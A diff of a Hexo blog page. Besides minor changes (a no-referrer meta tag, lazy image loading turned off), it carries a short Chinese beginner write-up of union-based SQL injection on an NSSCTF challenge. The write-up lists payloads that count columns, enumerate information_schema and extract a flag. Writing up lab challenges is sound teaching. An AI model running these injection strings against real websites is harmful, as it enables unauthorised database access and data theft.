@@ -5,7 +5,7 @@
 
 
 
-<head>
+<head><!-- hexo injector head_begin start --><meta name="referrer" content="no-referrer" /><!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 
   <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
@@ -78,7 +78,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":true,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -282,15 +282,15 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png" srcset="/img/loading.gif" lazyload><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p>
+                <h1 id="Sql注入初识"><a href="#Sql注入初识" class="headerlink" title="Sql注入初识"></a>Sql注入初识</h1><p>&nbsp;&nbsp;我们首先了解sql注入就是在sql数据库语句执行的时候跳过正确的执行来进行我们的语句达到权限跳过直接进行命令的执行<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png"><br>以nssctf题为例<br>首先在了解了可以利用万能密码1’进行回显之后我们利用sql语句进行库的查看</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <p>确定几列之后便可以用语句查询</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure>
-<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png" srcset="/img/loading.gif" lazyload><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p>
+<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png"><br>便可以了解第二列和第三列的类型<br>然后输入一下语句，查询数据库名称，以及库中有什么表，<br>并查询两张表中的字段，发现flag</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png" srcset="/img/loading.gif" lazyload><br>最后从表中查询flag</p>
+<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png"><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png"><br>最后从表中查询flag</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure>
-<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png"></p>
 
                 
               </div>
@@ -541,10 +541,6 @@
 
 
 
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
 
 
 
